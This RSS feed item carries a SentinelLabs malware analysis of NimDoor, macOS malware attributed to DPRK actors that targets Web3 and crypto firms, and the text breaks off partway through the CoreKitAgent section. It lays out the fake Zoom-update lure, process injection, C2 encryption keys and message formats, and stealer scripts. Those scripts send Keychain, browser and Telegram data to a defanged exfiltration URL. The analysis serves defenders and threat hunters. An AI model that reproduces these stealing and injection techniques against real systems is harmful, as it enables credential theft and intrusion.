<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>SentinelLabs - We are hunters, reversers, exploit developers, and tinkerers shedding light on the world of malware, exploits, APTs, and cybercrime across all platforms.</title>
	<atom:link href="https://www.sentinelone.com/labs/feed/" rel="self" type="application/rss+xml" />
	<link>https://www.sentinelone.com/labs/</link>
	<description>Next Generation Endpoint Security</description>
	<lastBuildDate>Wed, 02 Jul 2025 01:45:45 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	
	<item>
		<title>macOS NimDoor &#124; DPRK Threat Actors Target Web3 and Crypto Platforms with Nim-Based Malware</title>
		<link>https://www.sentinelone.com/labs/macos-nimdoor-dprk-threat-actors-target-web3-and-crypto-platforms-with-nim-based-malware/</link>
		
		<dc:creator><![CDATA[Phil Stokes &amp; Raffaele Sabato]]></dc:creator>
		<pubDate>Wed, 02 Jul 2025 09:55:37 +0000</pubDate>
				<category><![CDATA[DPRK]]></category>
		<category><![CDATA[macOS]]></category>
		<guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&#038;p=124926</guid>

					<description><![CDATA[NimDoor shows how threat actors are continuing to explore cross-platform languages that introduce new levels of complexity for analysts.]]></description>
										<content:encoded><![CDATA[<h2>Executive Summary</h2>
<ul>
<li aria-level="1">DPRK threat actors are utilizing Nim-compiled binaries and multiple attack chains in a campaign targeting Web3 and Crypto-related businesses.</li>
<li aria-level="1">Unusually for macOS malware, the threat actors employ a process injection technique and remote communications via <code>wss</code>, the TLS-encrypted version of the WebSocket protocol.</li>
<li aria-level="1"> A novel persistence mechanism takes advantage of SIGINT/SIGTERM signal handlers to install persistence when the malware is terminated or the system rebooted.</li>
<li aria-level="1">The threat actors deploy AppleScripts widely, both to gain initial access and also later in the attack chain to function as lightweight beacons and backdoors.</li>
<li aria-level="1">Bash scripts are used to exfiltrate Keychain credentials, browser data and Telegram user data.</li>
<li aria-level="1">SentinelLABS&#8217; analysis highlights novel TTPs and malware artifacts that tie together previously reported components, extending our understanding of the threat actors&#8217; evolving playbook.</li>
</ul>
<p>In April 2025, <a href="https://huntability.tech/threat-note-2025-04-23-nk-zoom/" target="_blank" rel="noopener noreferrer">Huntabil.IT</a> observed a targeted attack on a Web3 startup, attributing the incident to a DPRK threat actor group. Several reports on social media at the time described similar incidents at other Web3 and Crypto organizations. Analysis revealed an attack chain consisting of an eclectic mix of scripts and binaries written in AppleScript, C++ and Nim. Although the early stages of the attack follow a familiar DPRK pattern using social engineering, lure scripts and fake updates, the use of Nim-compiled binaries on macOS is a more unusual choice. A report by <a href="https://www.huntress.com/blog/inside-bluenoroff-web3-intrusion-analysis" target="_blank" rel="noopener noreferrer">Huntress</a> in mid-June described a similar initial attack chain as observed by Huntabil.IT, albeit using different later stage payloads.</p>
<p>SentinelLABS&#8217; analysis of the payloads used in the April incidents shows the Nim stages contain some unique features including encrypted configuration handling, asynchronous execution built around Nim&#8217;s native runtime, and a signal-based persistence mechanism previously unseen in macOS malware.</p>
<p>In this post, we provide an overview of the attack chain and a technical analysis of the C++ and Nim-based components. We refer to this family of malware collectively as NimDoor, based on its functionality and development traits. Indicators of compromise and insights into the malware&#8217;s architecture are provided to aid defenders and threat hunters in identifying related activity.</p>
<h2>Initial Access and Payload Delivery</h2>
<p>The attack chain begins with a now-familiar social engineering vector: impersonation of a trusted contact over Telegram and inviting the target to schedule a meeting via Calendly. The target is subsequently sent an email containing a Zoom meeting link and instructions to run a so-called &#8220;Zoom SDK update script&#8221;.</p>
<p>An attacker-controlled domain hosts an AppleScript file named <code>zoom_sdk_support.scpt</code>. Variants of this script can be found in public malware repositories through the seemingly unintentional typo in a code comment: <code>- - Zook SDK Update</code> instead of <code>- - Zoom SDK Update</code>. The file is heavily padded, containing 10,000 lines of whitespace to obfuscate its true function.</p>
<figure id="attachment_124992" aria-describedby="caption-attachment-124992" style="width: 1918px" class="wp-caption aligncenter"><img fetchpriority="high" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_14.jpg" alt="The zoom_sdk_support.scpt is padded with 10k lines of whitespace; note the typo ‘Zook’ and the scroll bar, top right" width="1918" height="1148" class="size-full wp-image-124992" srcset="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_14.jpg 1918w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_14-300x180.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_14-1024x613.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_14-768x460.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_14-1536x919.jpg 1536w" sizes="(max-width: 1918px) 100vw, 1918px" /><figcaption id="caption-attachment-124992" class="wp-caption-text">The <em>zoom_sdk_support.scpt</em> is padded with 10k lines of whitespace; note the typo ‘Zook’ and the scroll bar, top right</figcaption></figure>
<p>The script ends with three lines of malicious code that retrieve and execute a second-stage script from a command-and-control server hosted at <code>support.us05web-zoom[.]forum</code>. This domain name format has been chosen for similarity to the legitimate Zoom meeting domain <code>us05web.zoom[.]us</code>.</p>
<p>Our analysis found a number of parallel domains in use by the same actor.</p>
<pre>
support.us05web-zoom[.]pro
support.us05web-zoom[.]forum
support.us05web-zoom[.]cloud
support.us06web-zoom[.]online
</pre>
<figure id="attachment_125004" aria-describedby="caption-attachment-125004" style="width: 1436px" class="wp-caption aligncenter"><img decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_1.jpg" alt="Other examples found in public repositories suggest a wider campaign, possibly with unique URLs for each target" width="1436" height="802" class="size-full wp-image-125004" srcset="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_1.jpg 1436w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_1-300x168.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_1-1024x572.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_1-768x429.jpg 768w" sizes="(max-width: 1436px) 100vw, 1436px" /><figcaption id="caption-attachment-125004" class="wp-caption-text">Other examples found in public repositories suggest a wider campaign, possibly with unique URLs for each target</figcaption></figure>
<p>The follow-on script downloads an HTML file named <code>check</code>, which includes a legitimate Zoom redirect link.</p>
<pre>
&lt;a ref="https://us05web.zoom[.]us/j/4724012536?pwd=ADlAXdxkUclRhvYoJbpKQmizkQ1RV4.1">Temporary Redirect&lt;/a>
</pre>
<p>This HTML file is passed to <code>curl</code> and executed via <code>run script</code>, ultimately launching the attack&#8217;s core logic.</p>
<p>Researchers at <a href="https://www.validin.com/blog/zooming_through_bluenoroff_pivots/" target="_blank" rel="noopener noreferrer">Validin</a> have also recently published extended indicators around this and associated infrastructure. The posts by Huntabil.IT and Huntress mentioned earlier describe much the same initial attack chain. However, the second part of the attack chain is where things begin to get both different and increasingly complex.</p>
<h2>Execution Chain and File Deployment</h2>
<p>The multi-staged infection process Huntabil.IT observed resulted in the download of two Mach-O binaries—<code>a</code> and <code>installer</code>—into <code>/private/var/tmp</code>. These two binaries set off two independent execution chains.</p>
<p>In the first, the <code>a</code> binary is a C++-compiled universal architecture Mach-O executable. It writes an encrypted embedded payload called <code>netchk</code> to disk. The execution from here involves a complex chain of obfuscation and distraction which we describe in the following section. Ultimately, the aim is to fetch two Bash scripts used for data exfiltration. These include mechanisms for scraping general system data as well as application-specific data like browser data and Telegram chat histories. All operations are staged from a folder created at <code>~/Library/DnsService</code>.</p>
<p>The second execution chain starts with the <code>installer</code> binary, which is also a universal Mach-O executable compiled from Nim source code, and is responsible for persistence setup. It drops two additional Nim-compiled binaries: <code>GoogIe LLC</code> (where &#8220;GoogIe&#8221; is spelled using a deceptive capital &#8220;i&#8221; rather than a lowercase &#8216;L&#8217;) and <code>CoreKitAgent</code>. These payloads orchestrate long-term access and recovery mechanisms for the threat actor.</p>
<h2>Technical Analysis of a, netchk and trojan1_arm64</h2>
<p>Both Huntabil.IT and Huntress describe use of a C++-compiled binary with the name <code>a</code> being deposited as a result of initial infection through the fake Zoom update scripts described earlier.</p>
<p>The <code>a</code> binary is <i>ad hoc</i> signed and carries the identifier <code>InjectWithDyldArm64</code>. As reported by previous researchers, it can take a command line argument <code>--d</code>, which results in the deletion of <code>a</code>&#8216;s current working directory, or a file name and password. In the Huntabil.IT post, this was reported as:</p>
<pre>
./a ./netchk gift123$%^
</pre>
<p>The <code>InjectWithDyldArm64</code> (<i>aka</i> <code>a</code>) binary uses Password-Based Key Derivation Function 2 (<a href="https://en.wikipedia.org/wiki/PBKDF2" target="_blank" rel="noopener noreferrer">PBKDF2</a>) with HMAC-SHA-256 to derive a 32-byte key from the password <code>gift123$%^</code>, using 10000 iterations and a salt consisting of the first sixteen characters of the embedded base64 string.</p>
<p>The derived key and the base64 decoded encrypted data are passed to the <code>AesEncrypt</code> function, which iterates through 16 byte blocks of the encrypted data. On each iteration it:</p>
<ul>
<li aria-level="1">calls <code>AesTrans</code>, a wrapper for <a href="https://developer.apple.com/library/archive/documentation/System/Conceptual/ManPages_iPhoneOS/man3/CCCrypt.3cc.html" target="_blank" rel="noopener noreferrer">CCCrypt</a>, to perform an AES encryption in CBC mode with the derived key and a zero-filled initialization vector. In the first iteration the data to be encrypted is the key itself, but in subsequent iterations the input data is taken from the previous <code>AesTrans</code> call.</li>
<li aria-level="1">XORs the current encrypted data block with the current <code>AesTrans</code> result.</li>
</ul>
<figure id="attachment_124995" aria-describedby="caption-attachment-124995" style="width: 1494px" class="wp-caption aligncenter"><img decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_11.jpg" alt="The AesTrans function is a wrapper of CCCrypt" width="1494" height="628" class="size-full wp-image-124995" srcset="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_11.jpg 1494w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_11-300x126.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_11-1024x430.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_11-768x323.jpg 768w" sizes="(max-width: 1494px) 100vw, 1494px" /><figcaption id="caption-attachment-124995" class="wp-caption-text">The <em>AesTrans</em> function is a wrapper of <em>CCCrypt</em></figcaption></figure>
<p>SentinelLABS&#8217; analysis shows that this process is used to decrypt two embedded binaries. The first carries an <i>ad hoc</i> signature and the identifier <code>Target</code>. The second has an <i>ad hoc</i> signature with the identifier <code>trojan1_arm64</code>. The <code>Target</code> binary is benign and appears to do nothing other than generate random numbers.</p>
<p>However, <code>Target</code> is spawned by <code>InjectWithDyldArm64</code> in a suspended state via</p>
<pre>
posix_spawnattr_init(&amp;attrp) &amp;&amp; !posix_spawnattr_setflags(&amp;attrp, POSIX_SPAWN_START_SUSPENDED)
posix_spawn(&amp;pid, filename, 0, &amp;attrp, argv_1, environ)
</pre>
<p>and injected with the <code>trojan1_arm64</code> binary&#8217;s code. After injection, the suspended <code>Target</code> process is resumed via</p>
<pre>
kill(pid, SIGCONT)
</pre>
<p>and the code from the <code>trojan1_arm64</code> binary is executed.</p>
<p>This kind of process injection technique is rare in macOS malware and requires specific entitlements to be performed; in this case, the <code>InjectWithDyldArm64</code> binary has the following entitlements to allow the injection:</p>
<pre>
com.apple.security.cs.debugger
com.apple.security.get-task-allow
</pre>
<p>After first negotiating an HTTP handshake, the injected code uses <code>wss</code> to communicate with the C2 &#8211; another uncommon technique for macOS malware &#8211; at <code>wss://firstfromsep[.]online/client</code>.</p>
<p>The malware uses multiple levels of RC4 encryption in combination with the base64 encoding and three different keys before the communication.</p>
<p>Our analysis found that the communication messages from the C2 use a JSON format of <code>{"name":"","payload":"","target":""}</code>. The name field takes the value <code>auth</code> or <code>message</code>.</p>
<p>When the <code>auth</code> value is used, the <code>payload</code> field has the JSON structure <code>{"uid":"","cipher":""}</code>, where the <code>uid</code> field contains a generated uid value and the <code>cipher</code> field contains the uid value encrypted using the key <code>Ej7bx@YRG2uUhya#50Yt*ao</code> and then encoded in base64. We suspect the <code>target</code> field is used for the victim identifier.</p>
<p>When the <code>message</code> value is used, the <code>payload</code> field value is encrypted using the key <code>3LZu5H$yF^FSwPu3SqbL*sK</code>. The payload has the JSON structure <code>{"cmd":, "data":""}</code> where the <code>cmd</code> field contains an <b>int</b> value for the command to be executed. Available commands we were able to identify in <code>trojan1_arm64</code> were as follows:</p>
<div style="overflow-x:auto;">
<table style="border-collapse: collapse; width: 100%; height: 120px;">
<tbody>
<tr style="height: 24px;">
<td style="width: 25%; height: 24px;"><strong>Command</strong></td>
<td style="width: 10%; height: 24px;"><strong>Code</strong></td>
<td style="width: 65%; height: 24px;"><strong>Function</strong></td>
</tr>
<tr style="height: 24px;">
<td style="width: 25%; height: 24px;">execCmd </td>
<td style="width: 10%; height: 24px;">12 </td>
<td style="width: 65%; height: 24px;">Execute the arbitrary command provided in the <code>data</code> field.</td>
</tr>
<tr style="height: 24px;">
<td style="width: 25%; height: 24px;">setCwd </td>
<td style="width: 10%; height: 24px;">34 </td>
<td style="width: 65%; height: 24px;">Change the Current Working Directory to the one given in the <code>data</code> field.</td>
</tr>
<tr style="height: 24px;">
<td style="width: 25%; height: 24px;">getCwd </td>
<td style="width: 10%; height: 24px;">78 </td>
<td style="width: 65%; height: 24px;">Get the Current Working Directory.</td>
</tr>
<tr style="height: 24px;">
<td style="width: 25%; height: 24px;">getSysInfo </td>
<td style="width: 10%; height: 24px;">234 </td>
<td style="width: 65%; height: 24px;">Get information about the system such as boot time, username, macOS version, machine name, platform and arch.</td>
</tr>
<tr style="height: 24px;">
<td style="width: 25%; height: 24px;"></td>
</tr>
</tbody>
</table>
</div>
<figure id="attachment_124994" aria-describedby="caption-attachment-124994" style="width: 1496px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_12.jpg" alt="Binary Ninja’s Medium Level Interpreted Language (MLIL) representation of the command processing code" width="1496" height="986" class="size-full wp-image-124994" srcset="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_12.jpg 1496w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_12-300x198.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_12-1024x675.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_12-768x506.jpg 768w" sizes="auto, (max-width: 1496px) 100vw, 1496px" /><figcaption id="caption-attachment-124994" class="wp-caption-text">Binary Ninja’s Medium Level Interpreted Language (MLIL) representation of the command processing code</figcaption></figure>
<p>The result of an executed command is returned to the C2 in the <code>payload</code> field, now having the form <code>{"cmd":,"err":,"data":""}</code>, where <code>cmd</code> contains the <b>int</b> value related to the command that was executed, <code>err</code> contains an <b>int</b> value related to success or failure, and <code>data</code> contains the results of the executed command. For example, when a <code>getSysInfo</code> command is executed, the <code>data</code> field will be populated with values in a JSON structure of the form <code>{"boottime":,"username":"","version":"","comname":"","platform":"","arch":""}</code>.</p>
<p>The whole JSON message is encrypted using the key <code>lZjJ7iuK2qcmMW6hacZOw62</code>.</p>
<h2>Data Stealing Bash Scripts</h2>
<p>The first part of the attack chain concludes with <code>trojan1_arm64</code> downloading and executing two scripts, <code>upl</code> and <code>tlgrm</code>.</p>
<p>The <code>upl</code> script is a credential-stealer designed to silently extract browser and system-level information, package it, and exfiltrate it. The script targets data from the following browsers:</p>
<ul>
<li aria-level="1">Arc</li>
<li aria-level="1">Brave</li>
<li aria-level="1">Firefox</li>
<li aria-level="1">Google Chrome</li>
<li aria-level="1">Microsoft Edge</li>
</ul>
<figure id="attachment_124991" aria-describedby="caption-attachment-124991" style="width: 1902px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_15.jpg" alt="Targeted browsers in the upl script" width="1902" height="584" class="size-full wp-image-124991" srcset="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_15.jpg 1902w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_15-300x92.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_15-1024x314.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_15-768x236.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_15-1536x472.jpg 1536w" sizes="auto, (max-width: 1902px) 100vw, 1902px" /><figcaption id="caption-attachment-124991" class="wp-caption-text">Targeted browsers in the <em>upl</em> script</figcaption></figure>
<p>Browser data is copied to</p>
<pre>
/private/var/tmp/uplex_&lt;username>/&lt;browser>/
</pre>
<p>The script also targets the following Keychain and shell files and directories:</p>
<pre>
/Library/Keychains/System.keychain
~/Library/Keychains/login.keychain-db
~/.bash_history
~/.zsh_history
~/.zsh/
</pre>
<p>The data is then compressed via <code>ditto -ck</code> and posted to the C2 using <code>curl</code>.</p>
<p>The <code>tlgrm</code> script steals Telegram’s encrypted local database (<code>postbox/db</code>) and the decryption key blob, <code>.tempkeyEncrypted</code>, presumably for offline decryption or brute force attempts.</p>
<figure id="attachment_124993" aria-describedby="caption-attachment-124993" style="width: 1746px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_13.jpg" alt="The tlgrm script targets the .tempkeyEncrypted file required for decryption" width="1746" height="906" class="size-full wp-image-124993" srcset="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_13.jpg 1746w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_13-300x156.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_13-1024x531.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_13-768x399.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_13-1536x797.jpg 1536w" sizes="auto, (max-width: 1746px) 100vw, 1746px" /><figcaption id="caption-attachment-124993" class="wp-caption-text">The <em>tlgrm</em> script targets the <em>.tempkeyEncrypted</em> file required for decryption</figcaption></figure>
<p>The Telegram data is exfiltrated to the same server used in the <code>upl</code> script. The <code>uploadData()</code> function in both scripts is identical save for one variable name used to specify the server address: <code>hostName</code> in <code>upl</code> and <code>serverUrl</code> in <code>tlgrm</code>.</p>
<pre>
upl:
hostName="https[:]//dataupload[.]store/uploadfiles"

tlgrm:
serverUrl="https[:]//dataupload[.]store/uploadfiles"
</pre>
<figure id="attachment_124998" aria-describedby="caption-attachment-124998" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_8.jpg" alt="Comparison of upl and tlgrm; the scripts use an almost identical function to exfiltrate user data" width="1999" height="444" class="size-full wp-image-124998" srcset="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_8.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_8-300x67.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_8-1024x227.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_8-768x171.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_8-1536x341.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-124998" class="wp-caption-text">Comparison of <em>upl</em> and <em>tlgrm</em>; the scripts use an almost identical function to exfiltrate user data</figcaption></figure>
<p>Our investigation found related scripts in public malware repositories that may be tied to similar attacks. We list these in the Indicators of Compromise section at the end of this post.</p>
<h2>Technical Analysis of installer, GoogIe LLC, and CoreKitAgent</h2>
<h3>Installer</h3>
<p>The second part of the attack chain begins with the <code>installer</code> binary dropped alongside <code>a</code> by the initial access scripts. Compiled from Nim and weighing in at ~233KB, the <code>installer</code> binary is a universal architecture Mach-O with an <i>ad hoc</i> signature and the identifier <code>user_startup_installer_arm64</code>.</p>
<p>The <code>installer</code> binary checks for the existence of a LaunchAgent at <code>[~]/Library/LaunchAgents/com.google.update.plist</code> and creates folder paths at <code>/Library/CoreKit/</code> and  <code>/Library/Application Support/GoogIe LLC/</code> for use by the later stages described in the following sections.</p>
<figure id="attachment_125003" aria-describedby="caption-attachment-125003" style="width: 1440px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_3.jpg" alt="The installer binary prepares the file paths for later stages" width="1440" height="202" class="size-full wp-image-125003" srcset="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_3.jpg 1440w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_3-300x42.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_3-1024x144.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_3-768x108.jpg 768w" sizes="auto, (max-width: 1440px) 100vw, 1440px" /><figcaption id="caption-attachment-125003" class="wp-caption-text">The <em>installer</em> binary prepares the file paths for later stages</figcaption></figure>
<p>The misspelling of <code>GoogIe LLC</code> (uppercase &#8216;i&#8217;, not lowercase &#8216;L&#8217;) is intended to help the malware blend in and avoid suspicion.</p>
<p>An interesting feature of this and the other compiled Nim binaries is the existence of code that at first blush could be mistaken for C2 command options.</p>
<figure id="attachment_125000" aria-describedby="caption-attachment-125000" style="width: 1000px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_6.jpg" alt="Boilerplate Nim code can look deceptively malicious" width="1000" height="532" class="size-full wp-image-125000" srcset="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_6.jpg 1000w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_6-300x160.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_6-768x409.jpg 768w" sizes="auto, (max-width: 1000px) 100vw, 1000px" /><figcaption id="caption-attachment-125000" class="wp-caption-text">Boilerplate Nim code can look deceptively malicious</figcaption></figure>
<p>Huntress researchers also reported observing a subset of these &#8220;po&#8221; commands in their analysis. Nim <a href="https://nim-lang.org/docs/osproc.html" target="_blank" rel="noopener noreferrer">documentation</a> reveals that these are part of Nim&#8217;s <a href="https://github.com/nim-lang/Nim/blob/version-2-2/lib/pure/osproc.nim#L1" target="_blank" rel="noopener noreferrer">std/osproc</a> module, used for executing OS processes, similar to the way Objective-C uses NSTask, and are not attacker-written code or malware artifacts.</p>
<p>We identified two versions of the <code>installer</code> binary, identical except for the path used to set up the config file used by later stage payloads. One version of <code>installer</code> uses <code>/private/tmp/cfg</code> (06566eabf54caafe36ebe94430d392b9cf3426ba) while the other uses <code>/private/tmp/.config</code> (08af4c21cd0a165695c756b6fda37016197b01e7).</p>
<figure id="attachment_124990" aria-describedby="caption-attachment-124990" style="width: 1730px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_16.jpg" alt="Two versions of the installer binary are identical save for the embedded config file path" width="1730" height="262" class="size-full wp-image-124990" srcset="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_16.jpg 1730w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_16-300x45.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_16-1024x155.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_16-768x116.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_16-1536x233.jpg 1536w" sizes="auto, (max-width: 1730px) 100vw, 1730px" /><figcaption id="caption-attachment-124990" class="wp-caption-text">Two versions of the <em>installer</em> binary are identical save for the embedded config file path</figcaption></figure>
<p>In both cases, <code>installer</code> checks that the file does not exist, then writes a 0 byte file to the path, setting write-only access (<code>O_WRONLY</code>) on the file. The file path contents are populated by the next stage <code>GoogIe LLC</code> and later read by <code>CoreKitAgent</code>.</p>
<h3>GoogIe LLC</h3>
<p>Compiled from Nim and approximately 195KB, the <code>GoogIe LLC</code> executable is a universal Mach-O bearing an <i>ad hoc</i> code signature with the identifier <code>user_startup_loader_arm4</code>. Interestingly, only the filename for this stage uses the typo spoofing trick; the parent folder <code>/Google LLC/</code> spells Google correctly with a lowercase &#8220;L&#8221;.</p>
<pre>
~/Library/Application Support/Google LLC/GoogIe LLC
</pre>
<p>The binary&#8217;s primary function is to set up a configuration file and launch the next stage, <code>CoreKitAgent</code>. The <code>GoogIe LLC</code> executable contains hardcoded data that is combined with local environmental data, encoded, and then written out to the config file in <code>/private/tmp</code>.</p>
<figure id="attachment_124987" aria-describedby="caption-attachment-124987" style="width: 1434px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_19.jpg" alt="Hardcoded data encrypted and written out to a hidden file /private/tmp/.config" width="1434" height="236" class="size-full wp-image-124987" srcset="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_19.jpg 1434w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_19-300x49.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_19-1024x169.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_19-768x126.jpg 768w" sizes="auto, (max-width: 1434px) 100vw, 1434px" /><figcaption id="caption-attachment-124987" class="wp-caption-text">Hardcoded data encrypted and written out to a hidden file <em>/private/tmp/.config</em></figcaption></figure>
<p>The resulting config file contains a 298 byte string of hexadecimal characters. This is later read by <code>CoreKitAgent</code>, which is responsible for writing the LaunchAgent to disk using <code>com.google.update.plist</code> for the Label key and the <code>GoogIe LLC</code> binary for the program argument. The data written to the config file is used as the value for the LaunchAgent&#8217;s CLIENT_AUTH_KEY key.</p>
<figure id="attachment_124997" aria-describedby="caption-attachment-124997" style="width: 1639px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_9.jpg" alt="The LaunchAgent contains customized Client and Server keys for communication with the C2" width="1639" height="1261" class="size-full wp-image-124997" srcset="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_9.jpg 1639w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_9-300x231.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_9-1024x788.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_9-768x591.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_9-1536x1182.jpg 1536w" sizes="auto, (max-width: 1639px) 100vw, 1639px" /><figcaption id="caption-attachment-124997" class="wp-caption-text">The LaunchAgent contains customized Client and Server keys for communication with the C2</figcaption></figure>
<p>The first 47 characters of the value of CLIENT_AUTH_KEY are also identical to the first 47 characters (of the total 86) used for the value of SERVER_AUTH_KEY.</p>
<p>When the LaunchAgent is activated by a user login or reboot, <code>GoogIe LLC</code> is launched, which in turn calls <code>CoreKitAgent</code> and the rest of the payload logic.</p>
<figure id="attachment_124986" aria-describedby="caption-attachment-124986" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_2.jpg" alt="Execution chain once the persistence mechanism is activated by a login or reboot" width="1999" height="909" class="size-full wp-image-124986" srcset="https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_2.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_2-300x136.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_2-1024x466.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_2-768x349.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/07/NimDoor_2-1536x698.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-124986" class="wp-caption-text">Execution chain once the persistence mechanism is activated by a login or reboot</figcaption></figure>
<h3>CoreKitAgent</h3>
<p>Of the four Nim binaries observed, <code>CoreKitAgent</code> is the most technically complex. It exists in both an unsigned stripped (~233KB) version and an <i>ad hoc</i> signed, unstripped (~340KB) version. VirusTotal telemetry indicates that the stripped version was uploaded from South Korea in October 2024. The unstripped version was observed in the wild in early April 2025. Although it is a universal binary, the <i>ad hoc</i> signature identifies the binary as <code>user_startup_main_arm64</code>.</p>
<p>The <code>CoreKitAgent</code> program operates as an event-driven application using macOS&#8217;s <a href="https://developer.apple.com/library/archive/documentation/System/Conceptual/ManPages_iPhoneOS/man2/kqueue.2.html" target="_blank" rel="noopener noreferrer">kqueue</a> mechanism. The <code>_main</code> function sets up Nim&#8217;s standard signal handlers and then hands control to an asynchronous continuation function <code>_mainX20X28AsyncX29___user95startup95main_u45</code>, which initiates the malware&#8217;s core logic.</p>
<p>Control flow within this function is handled by a 10-case switch statement implemented as a <a href="https://levelup.gitconnected.com/implementing-finite-state-machines-using-transition-tables-f2990a6f3bc5" target="_blank" rel="noopener noreferrer">table-driven state machine</a>, with an execution state stored in memory and updated via a lookup table with the following values:</p>
<pre>
00 00 fe ff 03 00 00 00 fe ff fe ff fe ff fe ff
</pre>
